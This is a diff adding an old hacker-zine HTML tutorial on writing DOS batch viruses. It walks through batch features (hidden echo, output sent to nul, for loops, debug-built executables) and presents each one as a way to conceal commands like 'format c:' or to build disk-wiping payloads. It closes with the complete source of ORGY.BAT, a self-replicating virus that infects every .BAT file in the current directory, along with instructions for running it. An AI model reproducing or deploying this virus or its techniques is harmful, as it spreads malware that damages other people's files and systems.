@@ -1,0 +1,371 @@
+<HTML>
+<HEAD>
+   <TITLE>Tutorials - Ye Olde Art of Ye Batch Viruses</TITLE>
+</HEAD>
+<BODY TEXT="#000000" BGCOLOR="#C0C0C0" LINK="#800000" VLINK="#800000" ALINK="#800000" BACKGROUND="tuback01.gif">
+<blockquote>
+  <p align="center"><font color="#004080"><b><font size="+3">Ye Olde Art of Ye 
+    Batch Viruses</font><br>
+    <font size="+1">by <a href="mailto:exegency@hotmail.com">E X E - G E N C Y</a></font></b></font> 
+  </p>
+  <center>
+    <hr>
+  </center>
+  <p>Most hackers are quite surprised when I say that it is possible to write 
+    viruses is the DOS batch programming language. Although Batch is not the most 
+    versatile programming language in the world, it does exhibit the two main 
+    aspects the make up conventional programming languages: Control structures 
+    and Data.</p>
+  <p>Yep, thats right. The Batch programming language included 'for' loops, 'if' 
+    statements, 'gotos' and you can also use the 'set' command to declare variables 
+    and assign values to them.</p>
+  <p>Before I show you a working batch virus and explain how it works, I'm gonna 
+    have to go over some of the aspects of Batch programming that you may or may 
+    not know.</p>
+  <hr>
+  <p><u><b><a name="contents">Contents</a></b></u></p>
+  <p> <a href="#section1">Basics of Batch programming</a><br>
+    <a href="#section2">Piping</a><br>
+    <a href="#section3">'for' loops</a><br>
+    <a href="#section4">'if's and 'goto's</a><br>
+    <a href="#section5">'set'ing variables</a><br>
+    <a href="#section6">Parameters to batch programs</a><br>
+    <a href="#section7">Including Assembly</a><br>
+    <a href="#section8">ORGY.BAT Virus source code</a><br>
+  </p>
+  <hr>
+  <p><u><b><a name="section1">Basics of Batch programming</a></b></u></p>
+  <p>Batch programs are ASCII text files that contain a list of DOS commands and 
+    can be executed from the command prompt. To make a valid Batch file you must 
+    use a simple ASCII text editor (notepad, MS-editor etc.) and save the file 
+    with a .BAT extension. To run the Batch file you have just created simply 
+    goto the DOS prompt, change to the directory that the program was saved to 
+    and then type its name. Below is an example of a simple DOS Batch program. 
+    It simply changes to the A: (floppy) drive and displays all the files on it:</p>
+  <pre>
+a:
+dir
+</pre>
+  <p>This batch program was saved as 'display.bat' and displays the following 
+    output:</p>
+  <pre>
+C:\>display
+
+C:\>a:
+
+A:\>dir
+
+ Volume in drive A has no label
+ Volume Serial Number is 14CF-2B4F
+ Directory of A:\
+
+COMMAND  COM        93,890  04-23-99 10:22p COMMAND.COM
+         1 file(s)         93,890 bytes
+         0 dir(s)       1,071,616 bytes free
+</pre>
+  <p>Notice how each command is 'echoed' to the screen along with it's output. 
+    This is not always desirable (especially not with Batch viruses) and can be 
+    overcome by placing the extra line '@echo off' at the top of the Batch program. 
+    For example the 'display.bat' program would become:</p>
+  <pre>
+@echo off
+a:
+dir
+</pre>
+  <p>...which displays the following output:</p>
+  <pre>
+C:\>display
+
+ Volume in drive A has no label
+ Volume Serial Number is 14CF-2B4F
+ Directory of A:\
+
+COMMAND  COM        93,890  04-23-99 10:22p COMMAND.COM
+         1 file(s)         93,890 bytes
+         0 dir(s)       1,071,616 bytes free
+</pre>
+  <p>Notice how the commands like 'a:' and 'dir' are not displayed on the screen 
+    although the output is. Supressing the commands in a batch file is extremely 
+    useful when writing a virus because you don't exactly want a command like 
+    'format c:' to be displayed. It is also possible to supress the output of 
+    a program by using the '&gt;' pipe (you will learn how to do this in the next 
+    section.) This is also usful when writing a batch virus as you might want 
+    to supress the output of a program.</p>
+  <p><a href="#contents">Contents</a></p>
+  <hr>
+  <p><u><b><a name="section2">Piping</a></b></u></p>
+  <p>Piping is the process of directing output from a command or program to a 
+    file or device and vice versa. To redirect output from a command/program to 
+    a file a programmer can use the '&gt;' symbol. For example, to redirect the 
+    output from a 'dir' to a file called 'test.txt' use:</p>
+  <pre>
+dir &gt; test.txt
+</pre>
+  <p>The file 'test.txt' will be created in the current directory and will store 
+    the listing of the current directory. If the file 'test.txt' already exists 
+    in the current directory then the original contents will be lost. Also note 
+    that the output of the 'dir' command will be outputted to the file <b>only</b> 
+    and not the screen.</p>
+  <p>It is also possible to append the output of a command to a file by using 
+    the '&gt;&gt;'. For example:</p>
+  <pre>
+dir c:\windows &gt; test.txt
+dir a:\ &gt;&gt; test.txt
+</pre>
+  <p>The above batch commands create a file in the current directory called 'test.txt' 
+    into which the listings of the 'c:\windows' and 'a:\' direcories are written. 
+    The listings of the windows directory are written first before the listings 
+    of the diskette drive are appended. Note once again that <b>nothing</b> will 
+    be displayed on the screen.</p>
+  <p>Although piping the output of a command to a file does prevent the user from 
+    knowing what is going on, the evidence is still left in a file for the user 
+    to dig up later. A better way to supress the embarrassing output is to send 
+    it to the 'nul' device. By sending the output to 'nul' it quite literally 
+    disappears (like /dev/null on *nix.) For example the following sends the output 
+    of 'dir' to the null device:</p>
+  <pre>
+dir &gt; nul
+</pre>
+  <p>It is also possible to send a file as the input to a command or program. 
+    This is done using the &lt; symbol. The most obvious example of using this 
+    is when a text file is piped to the debug program in order to compile a program. 
+    You wil learn more about this <a href="#section7">here</a> in the section 
+    regarding assembly programming.</p>
+  <p>For example, if you generated a text file called 'test.asm' that contained 
+    the following:</p>
+  <pre>
+n hello.com
+a 0100 mov ah,09
+a 0102 mov dx,0109
+a 0105 int 21
+a 0107 int 20
+a 0109 db 'hello world!$
+rcx
+16
+w
+q
+</pre>
+  <p>...then issued the following command at the DOS prompt or via a batch file:</p>
+  <pre>
+debug &lt; test.asm
+</pre>
+  <p> ...And a 22 byte file called 'hello.com' would appear in the current directory. 
+    When this file is run it simply uses function 09h of Interrupt 21h to display 
+    the message 'hello world!' on the screen. </p>
+  <p><a href="#contents">Contents</a></p>
+  <hr>
+  <p><u><b><a name="section3">'for' loops</a></b></u></p>
+  <p>Although in batch programs you can find files using the 'dir' command, a 
+    much better method (especially in the realm of virus programming) is to use 
+    the 'for' loop. The 'for' loop is used to find files in certain directories 
+    (or the current one) and performing operations on them. For example:</p>
+  <pre>
+for %%f in (*.*) do echo There is a file called: %%f
+</pre>
+  <p>The above line looks for all files in the current directory and assigns their 
+    names to the variable '%%f'. Each time a file is found the message 'There 
+    is a file called ' is displayed, followed by the name of the file found.</p>
+  <p>'for' loops can also be used for finding files that are in directories other 
+    than the current one. An example of this would be:</p>
+  <pre>
+for %%f in (c:\*.* c:\windows\*.* c:\windows\command\*.*) do copy %%f a:\
+</pre>
+  <p>The above line copies all the files from the root, windows and windows\command 
+    directories to the A: (floppy) drive.</p>
+  <p><a href="#contents">Contents</a></p>
+  <hr>
+  <p><u><b><a name="section4">'if's and 'goto's</a></b></u></p>
+  <p>The DOS programming language contains 2 program control structures besides 
+    the 'for' loop. The 'goto' statement can be used for diverting program control 
+    from one place in the batch program to another. For example:</p>
+  <pre>
+@echo off
+goto OverThere
+echo Hiya!
+:OverThere
+</pre>
+  <p>In the above program, the 'goto' command is used to jump past the echo command 
+    and therefore the string 'Hiya!' is never displayed.</p>
+  <p>Although 'goto's are normally considered to be poor programming, there is 
+    little choice but to use them in DOS batch programs. Although 'if' and 'for' 
+    control structures do exist, there is not 'else' or repeating loop ('while...do' 
+    or 'repeat...until'.)</p>
+  <p>The 'if' command is used to test wether something has occurred or is equal 
+    to something else. The 'if' statement can be used to check wether a particular 
+    file exists:</p>
+  <pre>
+if exist autoexec.bat echo AUTOEXEC.BAT exists in the current directory
+if not exist autoexec.bat echo AUTOEXEC.BAT does NOT exists in the current directory
+</pre>
+  <p>The above code checks wether the file 'autoexec.bat' exists in the current 
+    directory and displays a message accordingly. Two individual 'if' statements 
+    are required because there is no 'else' statement in the batch programming 
+    language.</p>
+  <p>The 'if' statement can also be used to check wether a variable or parameter 
+    is equal to a certain value. For example the following program check wether 
+    the parameter '/?' is passed to the batch program:</p>
+  <pre>
+@echo off
+if [%%1]==[/?] goto ShowOptions
+goto Finish
+:ShowOptions
+echo These are the options to this BATCH program:
+echo /u blah blah blah
+echo /x blah blah blah
+:Finish
+</pre>
+  <p>'if' statements can also be used to check the execution of the previous program 
+    executed. This is accomplished by checking the 'errorlevel' variable which 
+    contains the integer value returned by the last program run. (Most programs 
+    return a value to the operating system when it has finished executing or an 
+    error has occured and it was forced to abort. Programs normally return 0 (zero) 
+    if the program executed properly or returns a non-zero value otherwise.) Consider 
+    the following program:</p>
+  <pre>
+@echo off
+win
+if errorlevel 0 goto ProgramWasOK
+echo It appears that Windoze encountered and error and crashed
+echo Hardly surprising really!
+goto Finish
+:ProgramWasOK
+echo WOW! OMFG! SHOCK! HORROR!
+echo Windows didn't crash!!!!
+:Finish
+</pre>
+  <p><a href="#contents">Contents</a></p>
+  <hr>
+  <p><u><b><a name="section5">'set'ing variables</a></b></u></p>
+  <p>Although variables do exist in the DOS batch programming language, they are 
+    extremely limited. There are no integer, pointer or floating point variable 
+    types, only strings.</p>
+  <p>Assigning values to variables is accomplished with the 'set' command. For 
+    example, to assign create a variable called 'message' and assign it the value 
+    'hello' use:</p>
+  <pre>
+set message=hello
+</pre>
+  <p>If you now type:</p>
+  <pre>
+set
+</pre>
+  <p>...you will be presented with a list of all the variables that are currently 
+    occupying the environment memory. At the bottom of the list should be your 
+    variable:</p>
+  <pre>
+MESSAGE=hello
+</pre>
+  <p>It is also possible to concatonate varaibles. For example:</p>
+  <pre>
+set message1=hello
+set message2=goodbye
+set message3=%%message1%%john
+set message4=%%message1%%%%message2%%
+</pre>
+  <p>This declares 4 variables. The first 2 are assigned the values 'hello' and 
+    'goodbye' respectively. The 3rd variable is assigned the value of the first 
+    variable plus the new string 'john'. Note how the variable 'message1' is surrounded 
+    by '%' characters. This tells DOS that it is the name of a variable. The forth 
+    variable is assigned the value of the first two. Notice how both 'message1' 
+    and 'message2' are surrounded by '%' characters.</p>
+  <p>If you were to check all the varaibles in memoery by typing 'set' on its 
+    own you would see:</p>
+  <pre>
+MESSAGE1=hello
+MESSAGE2=goodbye
+MESSAGE3=hellojohn
+MESSAGE4=hellogoodbye
+</pre>
+  <p>One minor word of warning about variables. Don't use too many of them as 
+    you will use up the DOS enviroment space that is reserved for varaibles and 
+    other stuff.</p>
+  <p><a href="#contents">Contents</a></p>
+  <hr>
+  <p><u><b><a name="section6">Parameters to batch programs</a></b></u></p>
+  <p>Like any other kind of program, it is possible to pass parameters to batch 
+    programs. The parameters to a batch program are number %%0 to %%9. %%0 is 
+    always the name of the .BAT file being executed, %%1 is the first parameter, 
+    %%2 is the second parameter and so on.</p>
+  <p>Not much more to say about parameters really. Consider the following program:</p>
+  <pre>
+@echo off
+if [%%1]==[hello] goto hello
+if [%%1]==[goodbye] goto goodbye
+if [%%1]==[fuckoff] goto fuckoff
+goto otherparamter
+:hello
+echo hello there!
+goto finish
+:goodbye
+echo cya then!
+goto finish
+:fuckyou
+echo WELL FUCK YOU THEN!
+goto finish
+:otherparamter
+echo You didn't use 'hello', 'goodbye' or 'fuckoff' as a parameter
+:finish
+</pre>
+  <p>Just save the file above as TALK.BAT and run it with the one of the following 
+    parameters; 'hello', 'goodbye' or 'fuckoff'.</p>
+  <p><a href="#contents">Contents</a></p>
+  <hr>
+  <p><u><b><a name="section7">Including Assembly</a></b></u></p>
+  <p>As described in the <a href="#section2">piping section</a>, it is possible 
+    to greate batch programs that use assembly language and the DOS debug program 
+    to generate executable files. This is accomplished by piping the output of 
+    a bunch of 'echo' commands to a new file then piping that file back into debug. 
+    To explain this full consider the following program:</p>
+  <pre>
+@echo off
+echo N HELLO.COM &gt; hello.scr
+echo E 0100 B4 09 BA 09 01 CD 21 CD 20 48 65 6C 6C 6F 2C 20 &gt;&gt; hello.scr
+echo E 0110 77 6F 72 6C 64 21 24 &gt;&gt; hello.scr
+echo RCX &gt;&gt; hello.scr
+echo 0017 &gt;&gt; hello.scr
+echo W &gt;&gt; hello.scr
+echo Q &gt;&gt; hello.scr
+debug &lt; hello.scr
+hello
+</pre>
+  <p>The above program creates a debug script file called 'hello.scr' which contains 
+    all the commands required by debug to convert it into a .COM file. The script 
+    is then piped to debug which results in the creation of the 'hello.com' file. 
+    This file is then executed and the string 'hello world!' is displayed.</p>
+  <p>Of course it is possible to use debug to create far more malicious executable 
+    files. This would be useful if you wished to create a malicious payload that 
+    wipes the harddisk, CMOS etc.</p>
+  <p><a href="#contents">Contents</a></p>
+  <hr>
+  <p><u><b><a name="section8">ORGY.BAT Virus source code</a></b></u></p>
+  <p>Below is the source code to a very simple batch virus. When executed, the 
+    virus infects all the .BAT files in the current directory. It doesn't re-infect 
+    files but it cannot infect files that are already read-only, system or hidden.</p>
+  <p>If you want to experiment with this virus you must first make the virus file 
+    ORGY.BAT is read only (with the ATTRIB +R ORGY.BAT treatment.) This prevents 
+    the virus from re-infecting itself.</p>
+  <p>The virus is named after the american industrial/synth/metal band that supported 
+    KoRn on their 1999 Follow the Leader tour.</p>
+  <pre>
+@echo off
+echo orgy &gt; infect1.bat
+echo if [%%1]==[infect1.bat] goto DontBother &gt; infect2.bat
+echo if [%%1]==[infect2.bat] goto DontBother &gt;&gt; infect2.bat
+echo copy %%1 + infect1.bat %%1 &gt;&gt; infect2.bat
+echo attrib +r %%1 &gt;&gt; infect2.bat
+echo :DontBother &gt;&gt; infect2.bat
+attrib +r infect1.bat
+attrib +r infect2.bat
+for %%f in (*.bat) do call infect2 %%f
+attrib -r infect1.bat
+attrib -r infect2.bat
+del infect1.bat
+del infect2.bat
+rem ORGY.BAT virus by EXE-Gency/[KrashMag]
+rem email exegency@hotmail.com
+</pre>
+  <p><a href="#contents">Contents</a></p>
+  <hr>
+</blockquote>
+</BODY>
+</HTML>
